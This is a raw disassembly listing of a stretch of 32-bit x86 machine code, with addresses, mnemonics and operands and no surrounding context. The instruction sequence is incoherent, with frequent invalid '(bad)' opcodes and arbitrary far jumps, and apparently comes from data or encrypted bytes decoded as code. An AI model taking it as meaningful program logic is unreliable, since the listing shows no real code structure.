  429a59:	inc    edx
  429a5a:	pushf  
  429a5b:	pop    esp
  429a5c:	stc    
  429a5d:	xchg   BYTE PTR [ebx+0x5ea6d87],cl
  429a63:	sbb    dh,cl
  429a65:	inc    ebp
  429a66:	in     al,0x2a
  429a68:	call   0x49622bb9
  429a6d:	push   edi
  429a6e:	xchg   ebp,eax
  429a6f:	sbb    eax,0x3125ada4
  429a74:	sub    bh,BYTE PTR [edi-0x5c]
  429a77:	dec    ebx
  429a78:	add    al,0x27
  429a7a:	js     0x429ae0
  429a7c:	jge    0x429a8e
  429a7e:	sub    DWORD PTR [ecx],edi
  429a80:	add    BYTE PTR [eax+0x6b],dl
  429a83:	stos   DWORD PTR es:[edi],eax
  429a84:	aaa    
  429a85:	test   BYTE PTR [ebx+0xb],ch
  429a88:	(bad)  
  429a89:	outs   dx,DWORD PTR ds:[esi]
  429a8a:	pop    edx
  429a8b:	jl     0x429aed
  429a8d:	or     DWORD PTR [edx-0x68],esi
  429a90:	cmp    BYTE PTR [eax],al
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x5ca95667
  429b01:	cmp    DWORD PTR [eax+0x1be64da],edi
  429b07:	add    BYTE PTR ds:0x73000001,al
  429b0d:	out    0x5d,eax
  429b0f:	or     eax,0x7f1a7a43
  429b14:	out    0x7f,eax
  429b16:	inc    eax
  429b17:	repz sub DWORD PTR [ebp+0x213ab17c],ebp
  429b1e:	loop   0x429acb
  429b20:	xchg   edi,eax
  429b21:	stos   BYTE PTR es:[edi],al
  429b22:	cmp    eax,0x51b73be5
  429b27:	imul   esp,DWORD PTR ss:[edx],0x42
  429b2b:	in     al,0x6a
  429b2d:	rcl    DWORD PTR ds:0xa535f86,cl
  429b33:	mov    ebx,0x8bf6cd3d
  429b38:	ret    
  429b39:	mov    esi,0xcf79d95f
  429b3e:	xor    DWORD PTR [eax+0xcacdeda],esi
  429b44:	add    bl,BYTE PTR [ebp+0x27aa68b1]
  429b4a:	xchg   esi,eax
  429b4b:	dec    ebx
  429b4c:	dec    DWORD PTR [ebp-0x5d]
  429b4f:	push   ds
  429b50:	xchg   BYTE PTR [edx],al
  429b52:	stos   BYTE PTR es:[edi],al
  429b53:	fidivr WORD PTR [esi]
  429b55:	cdq    
  429b56:	jl     0x429b69
  429b58:	jmp    0xe0ea61d3
  429b5d:	mov    cl,0x33
  429b5f:	cld    
  429b60:	leave  
  429b61:	enter  0xe7bd,0x24
  429b65:	jmp    0x429b02
  429b67:	sub    BYTE PTR [esi+0x11],0xa9
  429b6b:	mov    edi,0x3de0d003
  429b70:	sbb    ebp,DWORD PTR [ebx-0x7b494115]
  429b76:	xchg   esi,eax
  429b77:	mov    eax,0xff7b8e36
  429b7c:	jns    0x429bf2
  429b7e:	(bad)
  429b81:	xchg   ebp,eax
  429b82:	and    eax,ecx
  429b84:	or     dh,bl
  429b86:	in     eax,dx
  429b87:	or     al,0xcc
  429b89:	fisubr DWORD PTR [edi-0x57]
  429b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b8d:	hlt    
  429b8e:	jns    0x429b8b
  429b90:	shl    ecx,cl
  429b92:	das    
  429b93:	dec    eax
  429b94:	jbe    0x429b61
  429b96:	imul   ecx,DWORD PTR [eax],0xffffffc9
  429b99:	xor    eax,0x73cc1860
  429b9e:	push   ds
  429b9f:	arpl   WORD PTR ds:0x45363228,cx
  429ba5:	aaa    
  429ba6:	test   eax,0x7cf16d1d
  429bab:	or     ebx,DWORD PTR [eax-0x5dcc3a98]
  429bb1:	ret    
  429bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429bb3:	fcmove st,st(6)
  429bb5:	dec    edx
  429bb6:	push   esp
  429bb7:	add    al,0x3a
  429bb9:	sbb    BYTE PTR [ebp+0x14e984be],al
  429bbf:	add    BYTE PTR [ebx+0x183a9b77],dl
  429bc5:	retf   
  429bc6:	cmp    eax,0xb530a0dc
  429bcb:	cmp    edx,eax
  429bcd:	mov    ?,WORD PTR [ebp-0x2eeae161]
  429bd3:	sbb    al,0x2f
  429bd5:	cdq    
  429bd6:	std    
  429bd7:	sub    ebp,DWORD PTR [edx]
  429bd9:	outs   dx,DWORD PTR ds:[esi]
  429bda:	mov    bh,bh
  429bdc:	mov    esp,0xf1d456e9
  429be1:	add    BYTE PTR [eax-0x57e31efd],dl
  429be7:	pop    ds
  429be8:	xchg   ebx,eax
  429be9:	test   al,0x79
  429beb:	cmp    ebp,DWORD PTR [edi]
  429bed:	stc    
  429bee:	or     al,0x28
  429bf0:	push   esp
  429bf1:	test   DWORD PTR [edi],0x3b37e34
  429bf7:	sbb    eax,0x38801c32
  429bfc:	jl     0x429c2e
  429bfe:	in     al,0x63
  429c00:	xchg   esi,eax
  429c01:	or     DWORD PTR [ebx-0x35],ecx
  429c04:	jmp    0x75559762
  429c09:	enter  0x7161,0xa6
  429c0d:	adc    BYTE PTR [ebx-0x37],ah
  429c10:	call   0x0:0x0
	...
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [eax-0x75],bh
  429c82:	pop    eax
  429c83:	lahf   
  429c84:	imul   edi,DWORD PTR [edi+0x1050001],0xc9120000
  429c8e:	dec    dl
  429c90:	scas   al,BYTE PTR es:[edi]
  429c91:	retf   
  429c92:	mov    ecx,0x599dc0bf
  429c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c98:	pop    edi
  429c99:	xchg   esp,eax
  429c9a:	jl     0x429ce9
  429c9c:	and    ebx,DWORD PTR [ecx+0x35]
  429c9f:	mov    ebp,0xae3f10a2
  429ca4:	push   0x2cb15394
  429ca9:	test   BYTE PTR [eax-0x3906663e],dh
  429caf:	pop    ds
  429cb0:	xchg   ebp,eax
  429cb1:	dec    edi
  429cb2:	dec    ecx
  429cb3:	cld    
  429cb4:	mov    edi,0x6d28c1b6
  429cb9:	mov    eax,0x1ab21ac3
  429cbe:	or     eax,0xa570ad1a
  429cc3:	stc    
  429cc4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  429cc6:	or     esp,ebx
  429cc8:	mov    esi,0x7bb3d5ef
  429ccd:	shl    DWORD PTR [ebx+ebx*2],0x71
  429cd1:	ret    
  429cd2:	and    al,0xf6
  429cd4:	mov    dh,0xaa
  429cd6:	or     BYTE PTR [edi+0x55],ch
  429cd9:	sub    esp,eax
  429cdb:	lock aam 0x5c
  429cde:	mov    al,0x7a
  429ce0:	inc    edx
  429ce1:	fidivr WORD PTR [esi+0x2b]
  429ce4:	das    
  429ce5:	jmp    0x429caf
  429ce7:	jmp    DWORD PTR [esi+0x3e]
  429cea:	fidivr DWORD PTR [esi+0x7b5f3a91]
  429cf0:	mov    BYTE PTR [ebx-0x12e5d0ec],bh
  429cf6:	adc    eax,0xb03124b9
  429cfb:	stos   DWORD PTR es:[edi],eax
  429cfc:	xchg   edi,eax
  429cfd:	pop    ss
  429cfe:	pop    esp
  429cff:	mov    esi,0xbbdcb42b
  429d04:	mov    ebx,0xe87fba79
  429d09:	push   esi
  429d0a:	rcr    BYTE PTR [ecx],0xcc
  429d0d:	je     0x429cee
  429d0f:	stc    
  429d10:	push   edi
  429d11:	push   0xc
  429d13:	cmp    eax,0x2d44e5a0
  429d18:	add    BYTE PTR [esi],cl
  429d1a:	div    DWORD PTR [ebx]
  429d1c:	push   0xd9b1fcdc
  429d21:	scas   eax,DWORD PTR es:[edi]
  429d22:	std    
  429d23:	into   
  429d24:	pop    ecx
  429d25:	and    ah,bl
  429d27:	and    eax,DWORD PTR [esi+eax*1-0x30]
  429d2b:	jmp    0x429d9f
  429d2d:	leave  
  429d2e:	xor    BYTE PTR [eax-0x44],al
  429d31:	aaa    
  429d32:	outs   dx,DWORD PTR ds:[esi]
  429d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d34:	cs inc eax
  429d36:	cld    
  429d37:	xor    eax,0x954b8443
  429d3c:	out    dx,al
  429d3d:	jp     0x429d24
  429d3f:	and    bh,al
  429d41:	fs jne 0x429d26
  429d44:	in     al,dx
  429d45:	ja     0x429d68
  429d47:	xor    ecx,DWORD PTR [ebx+0x3d8ee82]
  429d4d:	inc    esi
  429d4e:	and    esp,DWORD PTR [esp+ebx*8-0x4d33cd60]
  429d55:	and    al,cl
  429d57:	mov    ch,0x6e
  429d59:	(bad)  
  429d5a:	iret   
  429d5b:	fcmovne st,st(1)
  429d5d:	aaa    
  429d5e:	pop    edx
  429d5f:	mov    es,WORD PTR [ecx+0x7dd20749]
  429d65:	fistp  DWORD PTR [eax+0x1]
  429d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d69:	pop    esp
  429d6a:	dec    ecx
  429d6b:	(bad)  
  429d6c:	add    edx,DWORD PTR [ebp+0x70]
  429d6f:	mov    al,ds:0xde74825d
  429d74:	sar    DWORD PTR [edi],1
  429d76:	jo     0x429d7a
  429d78:	xchg   ebx,eax
  429d79:	sub    BYTE PTR [ebp+0x7b],al
  429d7c:	inc    ebx
  429d7d:	xor    ebp,DWORD PTR [eax+ebx*2]
  429d80:	dec    edi
  429d81:	ret    0x39a
  429d84:	xlat   BYTE PTR ds:[ebx]
  429d85:	mov    ds:0xafd26c3a,eax
  429d8a:	push   ebx
  429d8b:	cmp    esi,DWORD PTR [ebx+0x3482f384]
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	xchg   edx,eax
  429e01:	mov    ds:0xc06eef48,eax
  429e06:	add    DWORD PTR [eax],eax
  429e08:	add    eax,0xfb000001
  429e0d:	jmp    0x429dda
  429e0f:	push   ebx
  429e10:	or     eax,0x2a607353
  429e15:	xor    edx,DWORD PTR [ebp+edi*2+0x59]
  429e19:	dec    ecx
  429e1a:	imul   esp,esp,0xffffffd4
  429e1d:	push   ds
  429e1e:	out    dx,eax
  429e1f:	(bad)  
  429e20:	(bad)  
  429e22:	xchg   esi,eax
  429e23:	xchg   esi,eax
  429e24:	sub    edi,DWORD PTR [edx]
  429e26:	push   ds
  429e27:	call   0xa87fba34
  429e2c:	pop    eax
  429e2d:	sub    DWORD PTR [eax],edi
  429e2f:	pop    ss
  429e30:	xchg   ebx,eax
  429e31:	pop    ds
  429e32:	adc    edx,edx
  429e34:	rcr    BYTE PTR ds:0xc287669e,1
  429e3a:	es retf 
  429e3c:	and    al,0x9f
  429e3e:	jle    0x429ddb
  429e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e41:	jmp    0x429e86
  429e43:	dec    ebx
  429e44:	ret    0x113c
  429e47:	(bad)  [esp+esi*1-0x74]
  429e4b:	adc    ch,BYTE PTR [ebp+0x60]
  429e4e:	rcr    DWORD PTR [esi-0x66],1
  429e51:	retf   0x5c38
  429e54:	push   ecx
  429e55:	inc    esp
  429e56:	cwde   
  429e57:	push   esp
  429e58:	adc    ch,BYTE PTR [ecx+0x71b96d48]
  429e5e:	fisttp WORD PTR [ebp-0x1e]
  429e61:	cmp    BYTE PTR [edi],0x5e
  429e64:	addr16 pop ds
  429e66:	xor    DWORD PTR [ecx+esi*8],eax
  429e69:	xchg   edx,eax
  429e6a:	push   ebx
  429e6b:	sbb    al,0xa0
  429e6d:	and    BYTE PTR ds:0x3b6367cf,bh
  429e73:	outs   dx,BYTE PTR ds:[esi]
  429e74:	jmp    0x429e6c
  429e76:	mov    bh,0x4c
  429e78:	mov    ah,0xf1
  429e7a:	addr16 push cs
  429e7c:	gs or  edx,ecx
  429e7f:	outs   dx,BYTE PTR ds:[esi]
  429e80:	push   esi
  429e81:	leave  
  429e82:	leave  
  429e83:	push   ebp
  429e84:	inc    edx
  429e85:	mov    bh,0x6c
  429e87:	adc    BYTE PTR [eax+0x3026f7af],ah
  429e8d:	and    DWORD PTR [ecx],ebx
  429e8f:	xor    ecx,DWORD PTR [esi+edi*1-0xd]
  429e93:	sub    eax,DWORD PTR [eax-0x28]
  429e96:	mov    ch,0xd7
  429e98:	out    dx,eax
  429e99:	xchg   edi,eax
  429e9a:	or     bh,BYTE PTR [esi+0x1a]
  429e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e9e:	retf   
  429e9f:	bound  esp,QWORD PTR [edx]
  429ea1:	out    0x68,al
  429ea3:	cmp    BYTE PTR [edx-0x4f1823a9],dh
  429ea9:	lahf   
  429eaa:	sub    esp,0x2c
  429ead:	imul   esp,DWORD PTR ds:0x90d193eb,0x3bc70f2c
  429eb7:	jo     0x429e62
  429eb9:	mov    esi,0xe33ac4d1
  429ebe:	mov    ebp,0x76edb9c1
  429ec3:	lahf   
  429ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ec5:	dec    edi
  429ec6:	pushf  
  429ec7:	fild   WORD PTR ds:0x72166ee9
  429ecd:	sysexit 
  429ecf:	popf   
  429ed0:	icebp  
  429ed1:	outs   dx,BYTE PTR ds:[esi]
  429ed2:	sti    
  429ed3:	xor    DWORD PTR [ebx+ebp*8-0x37],0xc7325cc3
  429edb:	dec    ebx
  429edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429edd:	ror    DWORD PTR [ecx+0x55],1
  429ee0:	mov    dh,dh
  429ee2:	mov    esp,0xeed665f3
  429ee7:	sub    al,0x44
  429ee9:	jl     0x429f07
  429eeb:	lods   al,BYTE PTR ds:[esi]
  429eec:	add    al,0x2c
  429eee:	jns    0x429f49
  429ef0:	out    dx,eax
  429ef1:	push   ebx
  429ef2:	imul   eax,DWORD PTR [esi-0x237207ef],0xafb7d011
  429efc:	inc    eax
  429efd:	inc    esi
  429efe:	fsubr  DWORD PTR [esi+0x0]
  429f01:	icebp  
  429f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f03:	and    DWORD PTR [edi-0x76],0x4
  429f07:	stos   DWORD PTR es:[edi],eax
  429f08:	add    ch,ah
  429f0a:	pop    edx
  429f0b:	cmc    
  429f0c:	mov    edx,0x1b6ac71a
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x30720bba]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x7f000001
  429f8d:	xchg   ebp,eax
  429f8e:	mov    ds:0x4cd23ef4,al
  429f93:	jecxz  0x429f3b
  429f95:	aas    
  429f96:	jne    0x429f1a
  429f98:	ror    DWORD PTR [ebp-0x757acbef],1
  429f9e:	inc    esp
  429f9f:	xor    DWORD PTR ds:0x2f2e98d4,ebp
  429fa5:	fwait
  429fa6:	xchg   edi,eax
  429fa7:	mov    ecx,0xd4e8f657
  429fac:	lods   al,BYTE PTR ds:[esi]
  429fad:	adc    BYTE PTR [ecx],dl
  429faf:	gs aam 0xe7
  429fb2:	repnz iret 
  429fb4:	loop   0x429fcb
  429fb6:	inc    esi
  429fb7:	gs xor eax,0x39c79342
  429fbd:	sub    al,0x5b
  429fbf:	or     ebp,DWORD PTR [edi-0x16f06c1c]
  429fc5:	sub    BYTE PTR [esi-0x58f942dd],ch
  429fcb:	inc    edx
  429fcc:	lahf   
  429fcd:	rcr    BYTE PTR [edi-0x6a],0xde
  429fd1:	mov    esi,0xa5dd2dc4
  429fd6:	clc    
  429fd7:	jo     0x429ff4
  429fd9:	push   esi
  429fda:	outs   dx,BYTE PTR ds:[esi]
  429fdb:	les    eax,FWORD PTR [esi]
  429fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fdf:	mov    ebx,0xa8c37ae4
  429fe4:	jns    0x46f3bbc
  429fea:	inc    esi
  429feb:	stos   BYTE PTR es:[edi],al
  429fec:	cmc    
  429fed:	fld    TBYTE PTR [eax]
  429fef:	add    esp,ebx
  429ff1:	vpand  ymm5,ymm7,YMMWORD PTR ds:[esi]
  429ff6:	adc    eax,0xeb87f301
  429ffb:	xor    BYTE PTR [edi+0x60],dh
  429ffe:	mov    eax,ds:0x2bb8d4d9
  42a003:	dec    ebp
  42a004:	mov    ?,WORD PTR [ebp+0x697f685b]
  42a00a:	xchg   ecx,eax
  42a00b:	adc    ebp,ebx
  42a00d:	jnp    0x429fad
  42a00f:	xor    eax,0xbdfbb668
  42a014:	ret    
  42a015:	add    BYTE PTR [ebx+0x2d],dh
  42a018:	cmp    dl,0xbc
  42a01b:	xchg   BYTE PTR [eax+eax*2+0x2e],cl
  42a01f:	pop    eax
  42a020:	and    DWORD PTR [edx+0x78],ebp
  42a023:	jb     0x42a065
  42a025:	add    ah,BYTE PTR [edi-0x97c569c]
  42a02b:	sub    ebx,DWORD PTR [esi]
  42a02d:	loop   0x429fc9
  42a02f:	inc    esp
  42a030:	xchg   edi,eax
  42a031:	push   ds
  42a032:	sar    BYTE PTR [ebx],1
  42a034:	dec    edi
  42a035:	out    dx,eax
  42a036:	jp     0x429fcd
  42a038:	push   ecx
  42a039:	or     dl,al
  42a03b:	xchg   BYTE PTR ds:0x93e56091,dh
  42a041:	xchg   esi,eax
  42a042:	lock retf 
  42a044:	jge    0x42a081
  42a046:	cmc    
  42a047:	out    dx,eax
  42a048:	jge    0x42a05a
  42a04a:	sbb    eax,0x1e22f15
  42a04f:	xchg   DWORD PTR [ebp-0x792af887],ecx
  42a055:	mov    dl,0x77
  42a057:	sub    dl,BYTE PTR ds:0x11b179f0
  42a05d:	lds    esp,FWORD PTR [eax+eiz*1]
  42a060:	dec    esp
  42a061:	addr16 inc edx
  42a063:	pop    esp
  42a064:	hlt    
  42a065:	ss call ebx
  42a068:	scas   al,BYTE PTR es:[edi]
  42a069:	sub    edi,DWORD PTR [esp+ebp*1]
  42a06c:	mov    ch,0x91
  42a06e:	sub    dh,BYTE PTR [esi+eiz*1-0x71]
  42a072:	or     al,0xff
  42a074:	cdq    
  42a075:	ret    
  42a076:	inc    edi
  42a077:	aam    0xe9
  42a079:	adc    bl,cl
  42a07b:	call   0x807c:0xa6d2a5a2
  42a082:	fcomp  QWORD PTR [ebp+0x1e5472be]
  42a088:	xchg   esp,eax
  42a089:	stc    
  42a08a:	pop    ds
  42a08b:	sub    BYTE PTR [esi],0x74
  42a08e:	jecxz  0x42a074
  42a090:	in     eax,dx
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	jnp    0x42a131
  42a102:	in     al,0xc9
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0x61000001
  42a10d:	jno    0x42a0a5
  42a10f:	pop    edi
  42a110:	pop    edx
  42a111:	dec    ebx
  42a112:	scas   eax,DWORD PTR es:[edi]
  42a113:	out    dx,al
  42a114:	retf   
  42a115:	cmp    al,0x42
  42a117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a118:	xlat   BYTE PTR ds:[ebx]
  42a119:	cld    
  42a11a:	jo     0x42a130
  42a11c:	adc    eax,0xb668a8c0
  42a121:	lock sub dl,BYTE PTR [esi+0x4638f3f2]
  42a128:	ss (bad) 
  42a12a:	sar    BYTE PTR [ebx+0x2a],cl
  42a12d:	iret   
  42a12e:	push   cs
  42a12f:	iret   
  42a130:	mov    WORD PTR [ebx-0x374d68a5],cs
  42a136:	mov    edi,fs
  42a138:	pop    es
  42a139:	xchg   ebp,eax
  42a13a:	adc    BYTE PTR [ebx-0x10c321fc],ah
  42a140:	in     al,dx
  42a141:	aas    
  42a142:	cmp    al,0x32
  42a144:	sub    BYTE PTR [eax],bl
  42a146:	xlat   BYTE PTR ds:[ebx]
  42a147:	mov    esi,0x5ada84a
  42a14c:	push   0xfffffffa
  42a14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a14f:	call   0xa3c9:0xfcf5524f
  42a156:	xchg   DWORD PTR [edx-0x57],edx
  42a159:	pushf  
  42a15a:	sbb    dh,BYTE PTR [ecx-0x2d]
  42a15d:	imul   ebp,DWORD PTR [ecx+ebx*4],0xffffffa0
  42a161:	sbb    eax,0x6710a090
  42a166:	pop    edi
  42a167:	rol    DWORD PTR [eax],1
  42a169:	shr    DWORD PTR [edx+0x3304cf1b],cl
  42a16f:	stc    
  42a170:	mov    eax,ds:0xfdfb7dc8
  42a175:	push   edx
  42a176:	out    dx,eax
  42a177:	jbe    0x42a18c
  42a179:	dec    DWORD PTR [ebp-0x43]
  42a17c:	dec    ebx
  42a17d:	add    al,0x7d
  42a17f:	adc    eax,0x8ad1bb37
  42a184:	jp     0x42a1fc
  42a186:	ffreep st(0)
  42a188:	sbb    al,0xf3
  42a18a:	or     eax,esp
  42a18c:	mov    BYTE PTR [edi],ch
  42a18e:	sub    bl,dh
  42a190:	repnz xlat BYTE PTR ds:[ebx]
  42a192:	hlt    
  42a193:	jmp    0xf17e:0x882424f8
  42a19a:	sub    BYTE PTR ds:0x9ecad696,cl
  42a1a0:	jmp    0x998c:0xe215f015
  42a1a7:	dec    eax
  42a1a8:	or     ebp,edx
  42a1aa:	div    BYTE PTR [ebx-0x5ddc5ee4]
  42a1b0:	test   dl,ah
  42a1b2:	imul   esp,DWORD PTR [ecx-0x5d13a306],0xffffff9c
  42a1b9:	lods   eax,DWORD PTR ds:[esi]
  42a1ba:	add    al,0x27
  42a1bc:	pop    ebx
  42a1bd:	scas   eax,DWORD PTR es:[edi]
  42a1be:	aad    0x1b
  42a1c0:	inc    eax
  42a1c1:	cdq    
  42a1c2:	and    eax,0x9b6e27e3
  42a1c7:	xchg   ebp,eax
  42a1c8:	xor    BYTE PTR [esi-0x26],dl
  42a1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1cc:	push   bx
  42a1ce:	mov    cl,0xc2
  42a1d0:	cdq    
  42a1d1:	add    DWORD PTR [edi-0x7d],eax
  42a1d4:	sub    BYTE PTR [edx],bl
  42a1d6:	(bad)  
  42a1d7:	pusha  
  42a1d8:	leave  
  42a1d9:	test   eax,0x192e991e
  42a1de:	cmc    
  42a1df:	ds pop es
  42a1e1:	sbb    BYTE PTR [eax-0xa6f6b1f],bh
  42a1e7:	pop    ss
  42a1e8:	sti    
  42a1e9:	inc    esp
  42a1ea:	xchg   esp,eax
  42a1eb:	mov    ebx,0x32ff8389
  42a1f0:	neg    BYTE PTR [edx]
  42a1f2:	inc    esi
  42a1f3:	xchg   ebx,eax
  42a1f4:	ja     0x42a1fc
  42a1f6:	inc    ebp
  42a1f7:	daa    
  42a1f8:	rcr    DWORD PTR [edx],0xe4
  42a1fb:	(bad)  
  42a1fc:	in     eax,0x78
  42a1fe:	inc    edi
  42a1ff:	sbb    BYTE PTR [edx-0xe],cl
  42a202:	cmp    ah,BYTE PTR [esi-0x37]
  42a205:	xchg   ebx,eax
  42a206:	rol    DWORD PTR [eax+0x12],0xce
  42a20a:	mov    al,0x9e
  42a20c:	push   ss
  42a20d:	jmp    0x0:0x62aeb5
	...
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fsincos 
  42a281:	shl    DWORD PTR [edi+0x1c37df2],1
  42a287:	add    BYTE PTR ds:0x49000001,al
  42a28d:	cmp    al,0x6c
  42a28f:	push   ecx
  42a290:	hlt    
  42a291:	xchg   edx,eax
  42a292:	adc    eax,DWORD PTR [edi+eax*8]
  42a295:	aam    0x1
  42a297:	retf   
  42a298:	pop    edx
  42a299:	adc    al,BYTE PTR [esi]
  42a29b:	outs   dx,DWORD PTR ds:[esi]
  42a29c:	(bad)  
  42a29d:	cmc    
  42a29e:	bound  edx,QWORD PTR [edi+0x4f]
  42a2a1:	rol    DWORD PTR [esi],1
  42a2a3:	pop    ss
  42a2a4:	ds jno 0x42a319
  42a2a7:	dec    ebp
  42a2a8:	cpuid  
  42a2aa:	in     al,0xdd
  42a2ac:	jbe    0x42a297
  42a2ae:	in     al,dx
  42a2af:	mov    al,ds:0x7ecf12b2
  42a2b4:	push   esp
  42a2b5:	int3   
  42a2b6:	push   esp
  42a2b7:	(bad)  
  42a2b8:	pop    ds
  42a2b9:	loop   0x42a241
  42a2bb:	sub    eax,0xb898943e
  42a2c0:	xchg   edi,eax
  42a2c1:	dec    edx
  42a2c2:	mov    bl,0xfa
  42a2c4:	pop    ebx
  42a2c5:	fidiv  DWORD PTR [edi+0x47917d0]
  42a2cb:	lahf   
  42a2cc:	scas   eax,DWORD PTR es:[edi]
  42a2cd:	or     ebx,DWORD PTR [edi-0x37]
  42a2d0:	pop    ds
  42a2d1:	jmp    0x42a2a0
  42a2d3:	jmp    0xdd5d:0xa197033c
  42a2da:	jmp    0x462d:0xb1c1db55
  42a2e1:	mov    ch,0xcd
  42a2e3:	(bad)  
  42a2e4:	(bad)  
  42a2e5:	ja     0x42a366
  42a2e7:	lods   eax,DWORD PTR ds:[esi]
  42a2e8:	push   cs
  42a2e9:	dec    edx
  42a2eb:	fld    st(3)
  42a2ed:	jns    0x42a31e
  42a2ef:	popa   
  42a2f0:	pop    ecx
  42a2f1:	xor    edx,DWORD PTR [ecx-0x41]
  42a2f4:	mov    ebx,0x1653195
  42a2f9:	cwde   
  42a2fa:	je     0x42a354
  42a2fc:	sub    al,ch
  42a2fe:	mov    bl,0x52
  42a300:	lods   al,BYTE PTR ds:[esi]
  42a301:	int3   
  42a302:	fst    QWORD PTR [edi+0x3f]
  42a305:	inc    ecx
  42a306:	fwait
  42a307:	xor    eax,DWORD PTR [ebp-0x78d9923b]
  42a30d:	popa   
  42a30e:	ds push ebx
  42a310:	mov    ds:0x35c0f27a,eax
  42a315:	ror    DWORD PTR [ebx],cl
  42a317:	push   edx
  42a318:	mov    gs,WORD PTR [ecx]
  42a31a:	fdiv   st,st(7)
  42a31c:	mov    ?,WORD PTR [esi-0x31116bc9]
  42a322:	push   0xffffffb9
  42a324:	les    esi,FWORD PTR [edi-0x79]
  42a327:	push   0x7eff865d
  42a32c:	or     BYTE PTR [ebx+0x4f200e1],0xd7
  42a333:	outs   dx,DWORD PTR ds:[esi]
  42a334:	das    
  42a335:	out    0x5a,al
  42a337:	cmp    ecx,DWORD PTR [eax+0x61]
  42a33a:	scas   eax,DWORD PTR es:[edi]
  42a33b:	hlt    
  42a33c:	mov    eax,ds:0x554056a
  42a341:	arpl   WORD PTR [ebx+ebp*8-0x1efaebb0],sp
  42a348:	pop    ecx
  42a349:	bound  esp,QWORD PTR [ecx+edx*8-0x19]
  42a34d:	repz (bad) 
  42a34f:	xlat   BYTE PTR ds:[ebx]
  42a350:	enter  0x6489,0xf2
  42a354:	mov    al,ds:0xc53eea59
  42a359:	xor    ah,BYTE PTR [ebx-0x51]
  42a35c:	pop    esi
  42a35d:	inc    ebp
  42a35e:	ror    DWORD PTR [edi-0x2f],cl
  42a361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a362:	or     eax,edx
  42a364:	adc    al,0xf6
  42a366:	shr    BYTE PTR [ecx-0x47],1
  42a369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a36a:	ins    BYTE PTR es:[edi],dx
  42a36b:	fidiv  DWORD PTR [edx-0x6c]
  42a36e:	push   ds
  42a36f:	xlat   BYTE PTR ds:[ebx]
  42a370:	les    ebx,FWORD PTR [ecx+0x6d]
  42a373:	fwait
  42a374:	sub    ebp,DWORD PTR [eax+0x3a]
  42a377:	call   0xcaaef1e2
  42a37c:	std    
  42a37d:	cmp    eax,0xe6670512
  42a382:	add    DWORD PTR [ecx+0x5826f170],esp
  42a388:	test   DWORD PTR [edx],0x9bd5d458
  42a38e:	jle    0x42a33c
  42a390:	and    BYTE PTR [eax],al
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x41795d3d
  42a403:	fiadd  DWORD PTR [edx+0x50001c4]
  42a409:	add    DWORD PTR [eax],eax
  42a40b:	add    BYTE PTR [edi],ch
  42a40d:	jbe    0x42a3d7
  42a40f:	test   eax,0x3d8fb5b8
  42a414:	rcl    DWORD PTR [edi+0x4e],0x50
  42a418:	int3   
  42a419:	adc    ch,0x4e
  42a41c:	imul   edi,DWORD PTR [eax+eiz*2+0x4a6119a1],0xfffffff9
  42a424:	mov    dh,0xa4
  42a426:	bound  eax,QWORD PTR gs:[edi+0x41]
  42a42a:	popf   
  42a42b:	popf   
  42a42c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a42d:	sbb    DWORD PTR [eax-0x5cfb8e2c],edx
  42a433:	mov    ah,0xc3
  42a435:	dec    edi
  42a436:	adc    eax,0x889882a
  42a43b:	dec    ebp
  42a43c:	adc    ch,BYTE PTR [eax-0x27ac681e]
  42a442:	jge    0x42a413
  42a444:	sub    eax,0x3f66cc5f
  42a449:	cmp    dl,dl
